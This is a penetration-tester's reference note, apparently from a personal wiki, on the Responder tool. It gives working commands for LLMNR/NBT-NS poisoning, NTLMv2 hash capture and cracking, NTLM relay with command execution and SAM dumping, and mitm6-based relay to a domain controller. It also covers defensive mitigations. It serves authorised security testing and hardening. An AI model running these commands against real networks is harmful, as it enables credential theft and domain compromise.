---
title: Responder
tags: |-
  - tool
  - responder
  - LLMNR
  - NBT-NS
  - NTLMv2
  - poisoning
  - credential-capture
  - intermediate
category: exploitation
platform: Linux
install: apt install responder / git clone https://github.com/lgandx/Responder
created: 2026-03-26
updated: 2026-03-26
difficulty: intermediate
---

# 🎣 Responder

## What It Is
Responder is a LLMNR/NBT-NS/mDNS poisoner and rogue authentication server. It responds to broadcast name resolution requests on the local network to capture NTLMv2 hashes from Windows hosts. These hashes can be cracked offline or used in relay attacks.

## How It Works

```
1. Windows host tries to resolve "\\SharedDrive" (non-existent share)
2. DNS lookup fails → falls back to LLMNR broadcast
3. Responder hears broadcast and responds: "That's me!"
4. Windows sends NTLMv2 challenge/response to Responder
5. Responder logs the NTLMv2 hash
6. Hash is cracked offline (Hashcat) or relayed (ntlmrelayx)
```

**Protocols poisoned by default:**
- LLMNR (Link-Local Multicast Name Resolution) — UDP 5355
- NBT-NS (NetBIOS Name Service) — UDP 137
- mDNS (Multicast DNS) — UDP 5353

## Installation
```bash
# Kali Linux (pre-installed)
which responder

# From source
git clone https://github.com/lgandx/Responder
cd Responder

# Dependencies
sudo apt install python3 python3-pip
```

---

## Basic Usage

### Start Responder (Listen Mode)
```bash
# Identify your interface first
ip a

# Start poisoning on interface
sudo python3 Responder.py -I eth0

# Or on Kali
sudo responder -I eth0

# Verbose mode
sudo responder -I eth0 -v

# With wpad (fake WPAD proxy — triggers HTTP auth)
sudo responder -I eth0 -wFb
```

### Common Flags
| Flag | Description |
|---|---|
| `-I eth0` | Network interface to listen on |
| `-v` | Verbose mode |
| `-w` | Start WPAD rogue proxy server |
| `-F` | Force NTLM/Basic auth on wpad.dat |
| `-b` | Serve fake Basic HTTP auth (captures credentials) |
| `-r` | Enable answers for netbios wredir suffix queries |
| `-P` | Force NTLM (instead of Negotiate) — works with some configs |
| `--lm` | Force LM hashing downgrade (older systems) |
| `--disable-ess` | Disable Extended Session Security |

### Analyze Mode (No Poisoning — Just Listen)
```bash
# Just observe what broadcast traffic exists — no poisoning
sudo responder -I eth0 -A

# Use this during pre-engagement reconnaissance to understand the environment
```

---

## Captured Hashes

Hashes are saved to: `/usr/share/responder/logs/` (or `./logs/` from source)

```bash
# View captured hashes
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt

# Format:
# Username::Domain:Challenge:Hash:ClientChallenge
# administrator::CORP:1122334455667788:ABC123...:0101...
```

### Crack with Hashcat
```bash
# NTLMv2 hash = mode 5600
hashcat -m 5600 /usr/share/responder/logs/*.txt /usr/share/wordlists/rockyou.txt

# With rules for better coverage
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## NTLM Relay Attack (ntlmrelayx)

Instead of cracking hashes, relay them directly to another host. **Requires SMB signing to be disabled on target.**

```bash
# Step 1: Disable SMB and HTTP in Responder (to allow relay)
# Edit /etc/responder/Responder.conf
# Set SMB = Off, HTTP = Off

# Step 2: Start ntlmrelayx (from Impacket) to relay to targets
# -tf = targets file, -smb2support = SMBv2, -c = command to execute
ntlmrelayx.py -tf targets.txt -smb2support

# Or relay to a single target with command execution
ntlmrelayx.py -t smb://TARGET_IP -smb2support -c "whoami"

# Dump SAM on successful relay
ntlmrelayx.py -tf targets.txt -smb2support --dump

# Step 3: Start Responder
sudo responder -I eth0 -v

# When a victim connects → hash automatically relayed to targets.txt hosts
```

### Check SMB Signing (Required Before Relay)
```bash
# CME: signing:False = vulnerable to relay
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Nmap
nmap --script smb2-security-mode -p 445 192.168.1.0/24
# "message signing enabled but not required" = vulnerable
```

---

## IPv6 + mitm6 (Advanced)

Windows prefers IPv6 over IPv4. mitm6 poisons DHCPv6 responses to become the DNS server, triggering NTLM auth.

```bash
# mitm6 + ntlmrelayx combo (requires mitm6 installed)
# Step 1: Run mitm6 (makes attacker the DNS server via IPv6)
sudo mitm6 -d CORP.LOCAL

# Step 2: Run ntlmrelayx to relay captured auth to LDAP(S)
ntlmrelayx.py -6 -wh wpad.CORP.LOCAL -t ldaps://DC_IP --delegate-access

# This can create a computer account or modify ACLs for full domain compromise
```

---

## Responder Logs Location
```
/usr/share/responder/logs/    (package install)
./logs/                        (source install)

Files:
  SMB-NTLMv2-SSP-[IP].txt    ← SMB NTLMv2 hashes
  HTTP-NTLMv2-[IP].txt        ← HTTP NTLMv2 hashes
  HTTP-Clear-Text-[IP].txt    ← HTTP Basic Auth credentials (cleartext!)
  Config-Responder.log        ← Session log
```

---

## Opsec Notes
> ⚠️ Responder is extremely loud — it actively responds to broadcast traffic. It will be detected by:
> - Network monitoring for rogue LLMNR/NBT-NS responders
> - SIEM rules detecting unusual NTLMv2 authentications
> - Windows Event IDs 5156 (network connection) from unexpected hosts
- Only use on authorized assessments
- Analyze mode (`-A`) first to see what's available
- LLMNR and NBT-NS should be disabled by organizations as a hardening step (Group Policy)

---

## Defensive Mitigation

```
Disable LLMNR:  Computer Config → Administrative Templates → Network → DNS Client
                → Turn off multicast name resolution = Enabled

Disable NBT-NS: Network adapter → Properties → IPv4 → Advanced → WINS
                → Disable NetBIOS over TCP/IP

Enable SMB Signing: Prevents relay attacks even if hashes are captured
```

---

## Related Notes
- Impacket
- CrackMapExec
- Hashcat
- AD-Attack-Reference
- Active-Directory
- Network-Defense-Blue-Team

## References
- Responder GitHub: https://github.com/lgandx/Responder
- mitm6 GitHub: https://github.com/dirkjanm/mitm6
- MITRE ATT&CK T1557.001: LLMNR/NBT-NS Poisoning

---
<- [[Tools-MOC]]